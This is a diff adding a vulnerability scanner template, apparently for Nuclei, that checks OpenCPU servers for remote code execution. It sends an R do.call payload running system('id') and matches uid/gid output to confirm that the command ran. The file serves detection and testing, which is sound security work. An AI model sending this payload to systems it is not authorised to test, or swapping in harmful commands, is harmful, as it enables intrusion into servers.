@@ -1,0 +1,47 @@
+id: opencpu-rce
+
+info:
+  name: OpenCPU - Remote Code Execution
+  author: wa1tf0rme
+  severity: critical
+  description: |
+    Check for remote code execution via OpenCPU was conducted.
+  reference:
+    - https://pulsesecurity.co.nz/articles/R-Shells
+    - https://github.com/opencpu/opencpu/
+  metadata:
+    max-request: 1
+  tags: rce,opencpu,oss
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/ocpu/library/base/R/do.call/json"
+
+    body: |
+      what=function(x){  return(system(paste('id'), intern %3d T))}&args={}
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    max-redirects: 2
+    redirects: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - uid=
+          - gid=
+        condition: and
+
+      - type: status
+        status:
+          - 201
+
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - \(([a-z-]+)\)
+
+# digest: 4b0a0048304602210081e561aa4d2536e6a32a09f8a278c5200d38b1ef1f28f8c1ca4c02ce82690012022100b6b4f9d3c34041e8e3a6c3dca08e0ea35321d447d99b283e5f730099d576f818:922c64590222798bb761d5b6d8e72950
